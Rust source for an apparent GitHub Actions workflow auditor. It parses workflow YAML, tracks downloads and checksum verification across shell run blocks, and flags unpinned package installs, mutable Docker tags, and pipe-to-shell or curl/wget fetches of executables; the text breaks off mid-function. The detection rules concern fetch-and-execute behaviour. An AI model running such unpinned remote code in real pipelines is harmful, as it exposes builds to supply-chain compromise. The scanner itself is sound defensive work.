use anyhow::{Context, Result};
use serde_norway::Value;
use std::collections::HashMap;
use std::collections::HashSet;
use std::path::Path;
use std::process::ExitCode;
use std::sync::LazyLock;

use crate::audit_patterns::{
    self, DOCKER_PATTERNS, DOCKER_URL_PATTERNS, JS_PATTERNS, JS_URL_PATTERNS,
    PS_INSTALL_MODULE_UNVERSIONED, PY_PATTERNS, PY_URL_PATTERNS, Pattern,
    SH_CARGO_INSTALL_UNVERSIONED, SH_GEM_INSTALL_UNVERSIONED, SH_GH_RELEASE_LATEST, SH_GIT_CLONE,
    SH_NPM_UNVERSIONED, SH_NPX_UNVERSIONED, SH_PIP_GIT_URL_UNVERSIONED, SH_PIP_UNVERSIONED,
    SH_PIPX_UNVERSIONED, SH_UV_TOOL_INSTALL_UNVERSIONED, SH_UVX_UNVERSIONED, SHELL_PATTERNS,
    SHELL_PIPE_PATTERNS, SHELL_URL_PATTERNS, cargo_install_has_version, extract_urls,
    gem_install_has_version, gh_release_has_tag, git_clone_has_pinned_ref, npm_install_has_version,
    npx_has_version, pip_git_url_has_ref, pip_install_has_version, pipx_install_has_version,
    ps_install_has_required_version, url_has_version, uv_tool_install_has_version, uvx_has_version,
};
use crate::audit_shell::{
    FileArtifactEvent, UNKNOWN_FETCH_OUTPUT, checksum_verifies_target_with_material_policy_at,
    docker_unpinned_images, fetch_output_targets, file_artifact_events,
    git_clone_has_bound_sha_checkout, imports_runtime_gpg_key_at, is_shell_comment_line,
    join_continuations, mutates_curl_config, mutates_wget_config, mutates_wget_config_file,
    url_piped_to_jq,
};
use crate::audit_source::{
    ActionScanStatus, remote_action_scan_key, scan_action_source, scan_local_action_source_graph,
    short_sha,
};
use crate::audited_actions::{AuditSource, AuditedActions};
use crate::auth;
use crate::config::Config;
use crate::github::GitHubClient;
use crate::output::{AuditFinding, AuditMatch, AuditReport, sanitize_for_terminal};
use crate::workflow;
use colored::Colorize;
use regex::Regex;

/// Reason string for matches allowed via the `trusted-hosts` config list.
/// Shared between the allow site and the repo-config notice that counts them.
pub(crate) const REASON_TRUSTED_HOST: &str = "trusted host";
/// Reason string for matches allowed via `extra-data-formats` config entries.
pub(crate) const REASON_EXTRA_DATA_FORMAT: &str = "extra data format URL";

struct PkgRule {
    regex: &'static LazyLock<Regex>,
    is_pinned: fn(&str) -> bool,
    description: &'static str,
    severity: audit_patterns::Severity,
}

static PKG_RULES: &[PkgRule] = &[
    PkgRule {
        regex: &SH_PIP_UNVERSIONED,
        is_pinned: pip_install_has_version,
        description: "pip install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_NPM_UNVERSIONED,
        is_pinned: npm_install_has_version,
        description: "npm install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_CARGO_INSTALL_UNVERSIONED,
        is_pinned: cargo_install_has_version,
        description: "cargo install without --version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_GEM_INSTALL_UNVERSIONED,
        is_pinned: gem_install_has_version,
        description: "gem install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_NPX_UNVERSIONED,
        is_pinned: npx_has_version,
        description: "npx without version pin — fetches and executes latest on every run",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &SH_PIPX_UNVERSIONED,
        is_pinned: pipx_install_has_version,
        description: "pipx install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_UV_TOOL_INSTALL_UNVERSIONED,
        is_pinned: uv_tool_install_has_version,
        description: "uv tool install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_UVX_UNVERSIONED,
        is_pinned: uvx_has_version,
        description: "uvx without version pin — fetches and executes latest on every run",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &PS_INSTALL_MODULE_UNVERSIONED,
        is_pinned: ps_install_has_required_version,
        description: "PowerShell Install-Module/Install-Script without -RequiredVersion",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &SH_PIP_GIT_URL_UNVERSIONED,
        is_pinned: pip_git_url_has_ref,
        description: "pip install git+URL without @<ref> — tracks default branch HEAD",
        severity: audit_patterns::Severity::Medium,
    },
];

/// Accumulates findings and (when verbose) allowed matches during a scan.
///
/// `push_allowed` is a no-op when `verbose` is false, so callers can record
/// matches unconditionally without caring about the flag.
pub struct AuditCollector {
    pub findings: Vec<AuditFinding>,
    pub allowed: Vec<AuditMatch>,
    pub verbose: bool,
    /// Matches allowed via `trusted-hosts` — counted regardless of verbosity
    /// so the repo-config notice doesn't depend on `--verbose`.
    pub trusted_host_allowed: usize,
    /// Matches allowed via `extra-data-formats` — counted regardless of
    /// verbosity so repo-config notices surface score shaping.
    pub extra_data_format_allowed: usize,
}

impl AuditCollector {
    pub fn new(verbose: bool) -> Self {
        Self {
            findings: Vec::new(),
            allowed: Vec::new(),
            verbose,
            trusted_host_allowed: 0,
            extra_data_format_allowed: 0,
        }
    }

    pub fn push_finding(&mut self, finding: AuditFinding) {
        self.findings.push(finding);
    }

    pub fn push_allowed(&mut self, allowed: AuditMatch) {
        if allowed.reason == REASON_TRUSTED_HOST {
            self.trusted_host_allowed += 1;
        }
        if allowed.reason == REASON_EXTRA_DATA_FORMAT {
            self.extra_data_format_allowed += 1;
        }
        if self.verbose {
            self.allowed.push(allowed);
        }
    }
}

pub async fn run(
    repo_root: &Path,
    json: bool,
    sarif: bool,
    verbose: bool,
    no_audited_catalog: bool,
    config: &Config,
) -> Result<ExitCode> {
    // Machine-readable formats must keep stdout clean.
    let quiet = json || sarif;

    let token = auth::resolve_token().await;
    let client = token.as_ref().map(|t| GitHubClient::new(t.clone()));
    let had_token = client.is_some();

    let files = workflow::find_workflows(repo_root)?;
    let mut collector = AuditCollector::new(verbose);
    let mut scanned_actions: HashSet<String> = HashSet::new();
    let mut completed_actions: HashSet<String> = HashSet::new();
    let mut audited = AuditedActions::new(config.fetch_remote);
    let mut audited_bundled = 0usize;
    let mut audited_local_cache = 0usize;
    let mut audited_remote = 0usize;
    let mut scanned_fresh = 0usize;
    let mut scanned_unpinned_branch = 0usize;
    let mut scanned_unpinned_sliding = 0usize;
    let mut ignored = 0usize;
    let mut external_skipped: HashSet<String> = HashSet::new();
    let mut coverage_failures = Vec::new();

    for file in &files {
        let display_name = workflow::display_path(file.path(), repo_root);
        let safe_display_name = sanitize_for_terminal(&display_name);
        if !quiet {
            eprintln!("Scanning {safe_display_name}");
        }

        let content = match workflow::read_workflow(file) {
            Ok(content) => content,
            Err(e) if workflow::is_unsafe_workflow_path(&e) => return Err(e),
            Err(e) => {
                // One unreadable/non-UTF-8 workflow shouldn't abort the scan.
                eprintln!(
                    "  {} {}: {}",
                    "skipped".yellow(),
                    safe_display_name,
                    sanitize_for_terminal(&e.to_string())
                );
                coverage_failures.push(format!("{display_name}: workflow could not be read: {e}"));
                continue;
            }
        };

        match extract_job_run_blocks(file.path(), &content) {
            Ok(jobs) => {
                for run_blocks in jobs {
                    let mut shell_state = ShellScanState::default();
                    for block in &run_blocks {
                        scan_shell_content_with_state_at(
                            &block.content,
                            &display_name,
                            block.line,
                            "",
                            &mut collector,
                            config,
                            block.working_directory.as_deref(),
                            &mut shell_state,
                        );
                    }
                }
            }
            Err(e) => {
                // Unparsable YAML shouldn't sink the scan; the `uses:` regex
                // scan below still runs.
                eprintln!(
                    "  {} run-block scan of {}: {}",
                    "skipped".yellow(),
                    safe_display_name,
                    sanitize_for_terminal(&e.to_string())
                );
                coverage_failures.push(format!(
                    "{display_name}: run blocks could not be parsed: {e}"
                ));
            }
        }

        for unsupported in workflow::scan_unsupported_uses(&content) {
            coverage_failures.push(format!(
                "{display_name}:{}: unsupported uses target `{}`",
                unsupported.line_number, unsupported.value
            ));
        }

        for docker in workflow::scan_docker_refs(&content) {
            push_docker_ref_result(&docker, &display_name, &mut collector);
        }

        let mut actions = workflow::scan_content(&content);
        for action in workflow::scan_local_actions(&content) {
            let key = format!("local:{}", action.path);
            if !scanned_actions.insert(key.clone()) {
                continue;
            }

            if !quiet {
                eprintln!(
                    "  {} {}",
                    "Scanning local".blue(),
                    sanitize_for_terminal(&action.path)
                );
            }

            let findings_before = collector.findings.len();
            match scan_local_action_source_graph(repo_root, &action, &mut collector, config) {
                Ok((ActionScanStatus::Complete, nested)) => {
                    completed_actions.insert(key);
                    actions.extend(nested);
                }
                Ok((ActionScanStatus::Incomplete, nested)) => {
                    actions.extend(nested);
                    eprintln!(
                        "warning: incomplete scan of local action {}",
                        sanitize_for_terminal(&action.path)
                    );
                    coverage_failures.push(format!(
                        "{display_name}:{}: incomplete local action scan for {}",
                        action.line_number, action.path
                    ));
                }
                Err(e) => {
                    eprintln!(
                        "warning: could not scan local action {}: {}",
                        sanitize_for_terminal(&action.path),
                        sanitize_for_terminal(&e.to_string())
                    );
                    coverage_failures.push(format!(
                        "{display_name}:{}: local action {} could not be scanned: {e}",
                        action.line_number, action.path
                    ));
                }
            }
            for finding in collector.findings.iter_mut().skip(findings_before) {
                finding.workflow_file = Some(display_name.clone());
                finding.workflow_line = Some(action.line_number);
            }
        }

        if let Some(client) = &client {
            for action in &actions {
                let key = remote_action_scan_key(action);
                if !scanned_actions.insert(key.clone()) {
                    continue;
                }

                if config.is_action_ignored(&action.owner_repo()) {
                    ignored += 1;
                    if !quiet {
                        eprintln!(
                            "  {}@{} {}",
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(short_sha(&action.ref_string)),
                            "ignored".dimmed()
                        );
                    }
                    continue;
                }

                if !no_audited_catalog
                    && let Some(source) = audited
                        .check(
                            &action.owner,
                            &action.repo,
                            action.subpath.as_deref(),
                            &action.ref_string,
                        )
                        .await
                {
                    completed_actions.insert(key);
                    match source {
                        AuditSource::Bundled => audited_bundled += 1,
                        AuditSource::LocalCache => audited_local_cache += 1,
                        AuditSource::Remote => audited_remote += 1,
                    }
                    if !quiet {
                        eprintln!(
                            "  {}@{} {} ({})",
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(short_sha(&action.ref_string)),
                            "audited".green(),
                            source.label()
                        );
                    }
                    continue;
                }

                let pinned = matches!(
                    action.ref_type,
                    workflow::RefType::Sha | workflow::RefType::Tag
                );

                if !quiet {
                    if pinned {
                        eprintln!(
                            "  {} {}@{}",
                            "Fetching".blue(),
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(short_sha(&action.ref_string))
                        );
                    } else {
                        eprintln!(
                            "  {} {}@{} {}",
                            "Fetching".blue(),
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(short_sha(&action.ref_string)),
                            "(unpinned)".yellow()
                        );
                    }
                }

                let findings_before = collector.findings.len();
                match scan_action_source(client, action, &mut collector, config).await {
                    Ok(scan_status) => {
                        if scan_status == ActionScanStatus::Complete {
                            completed_actions.insert(key);
                            match action.ref_type {
                                workflow::RefType::Sha | workflow::RefType::Tag => {
                                    scanned_fresh += 1;
                                }
                                workflow::RefType::SlidingTag => {
                                    scanned_unpinned_sliding += 1;
                                }
                                workflow::RefType::Branch => {
                                    scanned_unpinned_branch += 1;
                                }
                            }
                        } else {
                            eprintln!(
                                "warning: incomplete scan of {}; clean verdict not cached",
                                sanitize_for_terminal(&action.full_name())
                            );
                            coverage_failures.push(format!(
                                "{display_name}:{}: incomplete source scan for {}",
                                action.line_number,
                                action.full_name()
                            ));
                        }
                        // Anchor remote-scan findings to the loading `uses:` line
                        // so SARIF results land inside the scanning repo.
                        for finding in collector.findings.iter_mut().skip(findings_before) {
                            finding.workflow_file = Some(display_name.clone());
                            finding.workflow_line = Some(action.line_number);
                        }
                        // Only cache clean verdicts for SHA refs — tag and branch
                        // contents can move after the verdict.
                        if scan_status == ActionScanStatus::Complete
                            && collector.findings.len() == findings_before
                            && action.ref_type == workflow::RefType::Sha
                        {
                            let tag = action.tag_comment.as_deref().unwrap_or(&action.ref_string);
                            audited.cache_clean(
                                &action.owner,
                                &action.repo,
                                action.subpath.as_deref(),
                                &action.ref_string,
                                tag,
                            );
                        }
                    }
                    Err(e) => {
                        let error = format!("{e:#}");
                        eprintln!(
                            "warning: could not scan {}: {}",
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(&error)
                        );
                        coverage_failures.push(format!(
                            "{display_name}:{}: {} could not be scanned: {error}",
                            action.line_number,
                            action.full_name()
                        ));
                    }
                }
            }
        } else {
            for action in actions {
                let key = remote_action_scan_key(&action);
                if !scanned_actions.insert(key.clone()) {
                    continue;
                }
                if config.is_action_ignored(&action.owner_repo()) {
                    ignored += 1;
                    continue;
                }
                if !no_audited_catalog
                    && let Some(source) = audited
                        .check(
                            &action.owner,
                            &action.repo,
                            action.subpath.as_deref(),
                            &action.ref_string,
                        )
                        .await
                {
                    completed_actions.insert(key);
                    match source {
                        AuditSource::Bundled => audited_bundled += 1,
                        AuditSource::LocalCache => audited_local_cache += 1,
                        AuditSource::Remote => audited_remote += 1,
                    }
                    if !quiet {
                        eprintln!(
                            "  {}@{} {} ({})",
                            sanitize_for_terminal(&action.full_name()),
                            sanitize_for_terminal(short_sha(&action.ref_string)),
                            "audited".green(),
                            source.label()
                        );
                    }
                } else {
                    external_skipped.insert(key);
                }
            }
        }
    }

    if !external_skipped.is_empty() {
        coverage_failures.push(format!(
            "{} external action{} skipped because no GitHub token was available",
            external_skipped.len(),
            if external_skipped.len() == 1 {
                " was"
            } else {
                "s were"
            }
        ));
    }

    if !quiet && !files.is_empty() {
        eprintln!();
    }

    let before_filters = collector.findings.len();
    collector.findings.retain(|f| {
        config.meets_severity(&f.severity) && !config.is_pattern_ignored(&f.description)
    });
    let suppressed = before_filters - collector.findings.len();

    // When auditing a repo you don't control, its own .pinprick.toml must not
    // silently set audit policy — say what it changed and how to opt out.
    if config.is_repo_local() {
        let trusted_host_allowed = collector.trusted_host_allowed;
        let mut parts = Vec::new();
        if suppressed > 0 {
            parts.push(format!("findings suppressed: {suppressed}"));
        }
        if ignored > 0 {
            parts.push(format!("actions skipped: {ignored}"));
        }
        if trusted_host_allowed > 0 {
            parts.push(format!("trusted-host fetches: {trusted_host_allowed}"));
        }
        if collector.extra_data_format_allowed > 0 {
            parts.push(format!(
                "extra-data-format fetches: {}",
                collector.extra_data_format_allowed
            ));
        }
        if !parts.is_empty() {
            eprintln!(
                "note: the scanned repo's .pinprick.toml affected results ({}) — rerun with --no-repo-config to ignore it",
                parts.join(", ")
            );
        }
    }

    collector
        .findings
        .sort_by_key(|f| match f.severity.as_str() {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        });

    let has_findings = !collector.findings.is_empty();
    coverage_failures.sort();
    coverage_failures.dedup();
    let coverage_complete = coverage_failures.is_empty();
    let report = AuditReport {
        actions_scanned: completed_actions.len(),
        findings: collector.findings,
        allowed: collector.allowed,
        had_token,
        audited_bundled,
        audited_local_cache,
        audited_remote,
        scanned_fresh,
        scanned_unpinned_branch,
        scanned_unpinned_sliding,
        ignored,
        external_actions_skipped: external_skipped.len(),
        coverage_complete,
        coverage_failures,
    };

    if sarif {
        report.print_sarif();
    } else if json {
        report.print_json();
    } else {
        report.print_human(verbose);
    }

    if !coverage_complete {
        Ok(ExitCode::from(2))
    } else if has_findings {
        Ok(ExitCode::from(1))
    } else {
        Ok(ExitCode::SUCCESS)
    }
}

/// Surface `uses: docker://…` container refs. A digest-pinned image is the
/// container analog of a SHA pin and is recorded as an allowed match;
/// `:latest`/untagged floats with the registry (high), and a named tag is
/// mutable and can be re-pushed (medium). No token or network is needed —
/// the classification is purely syntactic.
pub(crate) fn push_docker_ref_result(
    docker: &workflow::DockerRef,
    source_file: &str,
    collector: &mut AuditCollector,
) {
    let action = docker.uses_ref();
    match docker.pin {
        workflow::DockerPin::Digest => collector.push_allowed(AuditMatch::new(
            &audit_patterns::Severity::Low,
            &audit_patterns::Category::DockerUnpinned,
            &action,
            source_file,
            docker.line_number,
            &docker.raw_line,
            "digest-pinned image",
        )),
        workflow::DockerPin::Tag => collector.push_finding(AuditFinding::new(
            &audit_patterns::Severity::Medium,
            &audit_patterns::Category::DockerUnpinned,
            &action,
            source_file,
            docker.line_number,
            &docker.raw_line,
            format!(
                "container action image `{}` uses a mutable tag, not a digest",
                docker.image
            ),
        )),
        workflow::DockerPin::Latest => collector.push_finding(AuditFinding::new(
            &audit_patterns::Severity::High,
            &audit_patterns::Category::DockerUnpinned,
            &action,
            source_file,
            docker.line_number,
            &docker.raw_line,
            format!("container action uses unpinned image `{}`", docker.image),
        )),
    }
}

#[cfg(test)]
pub fn extract_run_blocks(path: &Path, content: &str) -> Result<Vec<(usize, String)>> {
    Ok(extract_job_run_blocks(path, content)?
        .into_iter()
        .flatten()
        .map(|block| (block.line, block.content))
        .collect())
}

pub(crate) struct WorkflowRunBlock {
    pub(crate) line: usize,
    pub(crate) content: String,
    pub(crate) working_directory: Option<String>,
}

pub(crate) fn extract_job_run_blocks(
    path: &Path,
    content: &str,
) -> Result<Vec<Vec<WorkflowRunBlock>>> {
    let yaml: Value =
        serde_norway::from_str(content).with_context(|| format!("parsing {}", path.display()))?;

    let mut jobs_with_blocks = Vec::new();
    let mut cursor: usize = 0; // 0-based line index, monotonically advancing
    let workflow_working_directory = run_working_directory(&yaml);

    // Walk jobs.*.steps[].run, including nested parallel groups.
    // serde_norway's Mapping preserves insertion order, so iterating here
    // visits `run:` blocks in document order and we can anchor each one at
    // the next matching line, never earlier ones.
    if let Some(jobs) = yaml.get("jobs").and_then(|j| j.as_mapping()) {
        for (_job_name, job) in jobs {
            let mut blocks = Vec::new();
            if let Some(steps) = job.get("steps") {
                let job_working_directory =
                    run_working_directory(job).or(workflow_working_directory);
                for (run, working_directory) in
                    collect_step_run_blocks_with_directory(steps, job_working_directory)
                {
                    let (line, next_cursor) = find_run_line(content, run, cursor);
                    cursor = next_cursor;
                    // Line 0 (not found) is kept — the block is still
                    // scanned, just unanchored.
                    blocks.push(WorkflowRunBlock {
                        line,
                        content: run.to_string(),
                        working_directory: working_directory.map(str::to_string),
                    });
                }
            }
            if !blocks.is_empty() {
                jobs_with_blocks.push(blocks);
            }
        }
    }

    Ok(jobs_with_blocks)
}

fn run_working_directory(value: &Value) -> Option<&str> {
    value
        .get("defaults")
        .and_then(|defaults| defaults.get("run"))
        .and_then(|run| run.get("working-directory"))
        .and_then(Value::as_str)
}

/// Collect the `run:` block bodies under a `steps:` sequence in document
/// order, descending into `parallel:` groups.
///
/// GitHub documents `parallel:` as a sequence of steps, so a nested group is
/// walked exactly like the top-level `steps:` list — which also covers
/// `parallel:` nested inside `parallel:`. A `background: true` step keeps its
/// own `run:` key and is collected like any other step. Steps without a `run:`
/// (`uses:`, `wait:`, `cancel:`) contribute nothing.
pub(crate) fn collect_step_run_blocks_with_directory<'a>(
    steps: &'a Value,
    default_working_directory: Option<&'a str>,
) -> Vec<(&'a str, Option<&'a str>)> {
    fn collect<'a>(
        steps: &'a Value,
        default_working_directory: Option<&'a str>,
        runs: &mut Vec<(&'a str, Option<&'a str>)>,
    ) {
        let Some(sequence) = steps.as_sequence() else {
            return;
        };

        for step in sequence {
            let Some(mapping) = step.as_mapping() else {
                continue;
            };
            let working_directory = step
                .get("working-directory")
                .and_then(Value::as_str)
                .or(default_working_directory);
            for (key, value) in mapping {
                match key.as_str() {
                    Some("run") => {
                        if let Some(run) = value.as_str() {
                            runs.push((run, working_directory));
                        }
                    }
                    Some("parallel") => collect(value, working_directory, runs),
                    _ => {}
                }
            }
        }
    }

    let mut runs = Vec::new();
    collect(steps, default_working_directory, &mut runs);
    runs
}

/// Locate the 1-based line of `run_content` in the raw file, starting the
/// search at `start` (0-based). Returns the line and the cursor to start the
/// next search at. A zero line means "not found"; the cursor is preserved.
///
/// Prefers an exact trimmed-line match so `echo hello` does not steal the
/// position of a longer line like `    echo hello world` that appears first.
/// Falls back to `contains` if no exact match is found past the cursor, which
/// preserves the prior behavior for run blocks that serde_norway normalized.
fn find_run_line(file_content: &str, run_content: &str, start: usize) -> (usize, usize) {
    let Some(first_line) = run_content.lines().next() else {
        return (0, start);
    };
    let trimmed = first_line.trim();
    if trimmed.is_empty() {
        return (0, start);
    }
    let run_line_count = run_content.lines().count();
    let mut contains_hit: Option<usize> = None;
    for (i, line) in file_content.lines().enumerate().skip(start) {
        if line.trim() == trimmed {
            return (i + 1, i + run_line_count);
        }
        if contains_hit.is_none() && line.contains(trimmed) {
            contains_hit = Some(i);
        }
    }
    match contains_hit {
        Some(i) => (i + 1, i + run_line_count),
        None => (0, start),
    }
}

#[derive(Default)]
pub(crate) struct ShellScanState {
    runtime_downloads: Vec<String>,
    wget_config_file_mutated: bool,
    curl_config_file_mutated: bool,
    runtime_gpg_key_imported: bool,
}

#[derive(Clone)]
enum RuntimeDirectory {
    Known(String),
    Unknown,
}

struct RuntimeDownloadRecord {
    raw: String,
    canonical: String,
}

struct RuntimeVerificationContext {
    index: usize,
    downloads: Vec<String>,
    working_directory: Option<String>,
    trust_gpg_verification: bool,
}

impl RuntimeDirectory {
    fn from_working_directory(working_directory: Option<&str>) -> Self {
        let directory = working_directory.unwrap_or_default();
        if runtime_path_is_dynamic(directory) {
            Self::Unknown
        } else {
            Self::Known(normalize_runtime_artifact_path(directory))
        }
    }

    fn change(&mut self, directory: &str) {
        if runtime_path_is_dynamic(directory) {
            *self = Self::Unknown;
            return;
        }
        let directory = directory.replace('\\', "/");
        if runtime_path_is_absolute(&directory) {
            *self = Self::Known(normalize_runtime_artifact_path(&directory));
            return;
        }
        let Self::Known(current) = self else {
            return;
        };
        *current = if current.is_empty() {
            normalize_runtime_artifact_path(&directory)
        } else {
            normalize_runtime_artifact_path(&format!("{current}/{directory}"))
        };
    }

    fn resolve(&self, path: &str) -> String {
        if path == UNKNOWN_FETCH_OUTPUT || runtime_path_is_dynamic(path) {
            return UNKNOWN_FETCH_OUTPUT.to_string();
        }
        let Self::Known(directory) = self else {
            return UNKNOWN_FETCH_OUTPUT.to_string();
        };
        let path = path.replace('\\', "/");
        if path.starts_with('/') || directory.is_empty() {
            normalize_runtime_artifact_path(&path)
        } else {
            normalize_runtime_artifact_path(&format!("{directory}/{path}"))
        }
    }

    fn known(&self) -> Option<&str> {
        match self {
            Self::Known(directory) => Some(directory),
            Self::Unknown => None,
        }
    }
}

fn runtime_path_is_dynamic(path: &str) -> bool {
    path.contains(['$', '`', '*', '?', '[']) || path.starts_with('~')
}

fn runtime_path_is_absolute(path: &str) -> bool {
    path.starts_with('/')
        || path
            .as_bytes()
            .get(1)
            .is_some_and(|separator| *separator == b':')
}

fn normalize_runtime_artifact_path(path: &str) -> String {
    let absolute = path.starts_with('/');
    let mut components = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." if components.last().is_some_and(|part| *part != "..") => {
                components.pop();
            }
            ".." if !absolute => components.push(component),
            ".." => {}
            _ => components.push(component),
        }
    }
    let normalized = components.join("/");
    if absolute {
        format!("/{normalized}")
    } else {
        normalized
    }
}

fn propagate_runtime_artifact_transfer(
    source: &str,
    destination: &str,
    working_directory: &RuntimeDirectory,
    artifacts: &mut Vec<String>,
) {
    let source = working_directory.resolve(source);
    let destination = working_directory.resolve(destination);
    let propagated: Vec<String> = if source == UNKNOWN_FETCH_OUTPUT && !artifacts.is_empty() {
        vec![UNKNOWN_FETCH_OUTPUT.to_string()]
    } else {
        let directory_prefix = format!("{source}/");
        let source_artifacts: Vec<&String> = artifacts
            .iter()
            .filter(|artifact| *artifact == &source || artifact.starts_with(&directory_prefix))
            .collect();
        if destination == UNKNOWN_FETCH_OUTPUT && !source_artifacts.is_empty() {
            vec![UNKNOWN_FETCH_OUTPUT.to_string()]
        } else {
            source_artifacts
                .into_iter()
                .filter_map(|artifact| {
                    if artifact == &source {
                        Some(destination.clone())
                    } else {
                        artifact.strip_prefix(&directory_prefix).map(|relative| {
                            normalize_runtime_artifact_path(&format!("{destination}/{relative}"))
                        })
                    }
                })
                .collect()
        }
    };
    for artifact in propagated {
        if !artifacts.contains(&artifact) {
            artifacts.push(artifact);
        }
    }
}

pub fn scan_shell_content(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    scan_shell_content_with_state(
        content,
        source_file,
        base_line,
        action_name,
        collector,
        config,
        &mut ShellScanState::default(),
    );
}

pub(crate) fn scan_shell_content_with_state(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
    state: &mut ShellScanState,
) {
    scan_shell_content_with_state_at(
        content,
        source_file,
        base_line,
        action_name,
        collector,
        config,
        None,
        state,
    );
}

#[allow(clippy::too_many_arguments)]
pub(crate) fn scan_shell_content_with_state_at(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
    working_directory: Option<&str>,
    state: &mut ShellScanState,
) {
    // All passes scan logical lines — a command split across physical lines
    // with trailing backslashes is one shell command, and scanning the pieces
    // separately would let `curl … \` + `<url>` evade every two-part pattern.
    let logical = join_continuations(content);
    let mut runtime_downloads = state.runtime_downloads.clone();
    let mut runtime_download_records_through_line = Vec::with_capacity(logical.len());
    let mut verification_contexts_through_line = Vec::with_capacity(logical.len());
    let mut wget_config_file_mutated = state.wget_config_file_mutated;
    let mut curl_config_file_mutated = state.curl_config_file_mutated;
    let mut wget_configured = wget_config_file_mutated;
    let mut curl_configured = curl_config_file_mutated;
    let mut runtime_gpg_key_imported = state.runtime_gpg_key_imported;
    let mut runtime_directory = RuntimeDirectory::from_working_directory(working_directory);
    for (_, line) in &logical {
        let mut line_downloads = Vec::new();
        let mut verification_contexts = Vec::new();
        let mut verification_index = 0;
        wget_config_file_mutated |= mutates_wget_config_file(line);
        curl_config_file_mutated |= mutates_curl_config(line);
        wget_configured |= mutates_wget_config(line);
        curl_configured |= mutates_curl_config(line);
        for event in file_artifact_events(line, wget_configured, curl_configured) {
            match event {
                FileArtifactEvent::ChangeDirectory(directory) => {
                    runtime_directory.change(&directory)
                }
                FileArtifactEvent::UnresolvedDirectory => {
                    runtime_directory = RuntimeDirectory::Unknown
                }
                FileArtifactEvent::Download(target) => {
                    let canonical = runtime_directory.resolve(&target);
                    line_downloads.push(RuntimeDownloadRecord {
                        raw: target,
                        canonical: canonical.clone(),
                    });
                    runtime_downloads.push(canonical);
                }
                FileArtifactEvent::Transfer {
                    source,
                    destination,
                } => propagate_runtime_artifact_transfer(
                    &source,
                    &destination,
                    &runtime_directory,
                    &mut runtime_downloads,
                ),
                FileArtifactEvent::RuntimeGpgImport(command) => {
                    runtime_gpg_key_imported |= imports_runtime_gpg_key_at(
                        &command,
                        &runtime_downloads,
                        runtime_directory.known(),
                    )
                }
                FileArtifactEvent::Verification => {
                    verification_contexts.push(RuntimeVerificationContext {
                        index: verification_index,
                        downloads: runtime_downloads.clone(),
                        working_directory: runtime_directory.known().map(str::to_string),
                        trust_gpg_verification: !runtime_gpg_key_imported,
                    });
                    verification_index += 1;
                }
            }
        }
        runtime_download_records_through_line.push(line_downloads);
        verification_contexts_through_line.push(verification_contexts);
    }
    state.runtime_downloads = runtime_downloads;
    state.wget_config_file_mutated = wget_config_file_mutated;
    state.curl_config_file_mutated = curl_config_file_mutated;
    state.runtime_gpg_key_imported = runtime_gpg_key_imported;

    // Pipe-to-shell pass runs first so its findings land before `findings_before`
    // and escape the checksum downgrade loop below.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, joined) in &logical {
        if is_shell_comment_line(joined) {
            continue;
        }
        let line_num = base_line + start;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            joined,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    let findings_before = collector.findings.len();

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        if is_shell_comment_line(line) {
            continue;
        }
        let line_num = base_line + start;
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }

        let before = collector.findings.len();
        check_patterns(
            &SHELL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        let shell_matched = collector.findings.len() > before;

        // A `/latest/` URL already triggers the high-severity SH_*_LATEST rule
        // in SHELL_PATTERNS. Running SHELL_URL_PATTERNS on the same line would
        // re-flag it as a medium unversioned URL — duplicate noise.
        if !shell_matched {
            check_url_patterns(
                &SHELL_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }

        if SH_GH_RELEASE_LATEST.is_match(line) && !gh_release_has_tag(line) {
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::Medium,
                &audit_patterns::Category::ShellFetch,
                action_name,
                source_file,
                line_num,
                line,
                "gh release download without pinned version",
            ));
        }

        for image in docker_unpinned_images(line) {
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::High,
                &audit_patterns::Category::DockerUnpinned,
                action_name,
                source_file,
                line_num,
                line,
                format!("docker pull/run uses unpinned image `{image}`"),
            ));
        }

        match classify_non_literal_executable(line, config) {
            NonLiteralFetch::Finding => {
                collector.push_finding(AuditFinding::new(
                    &audit_patterns::Severity::Low,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "curl/wget downloads executable from non-literal source — cannot verify URL version",
                ));
            }
            NonLiteralFetch::ExtraDataFormat => {
                collector.push_allowed(AuditMatch::new(
                    &audit_patterns::Severity::Low,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    REASON_EXTRA_DATA_FORMAT,
                ));
            }
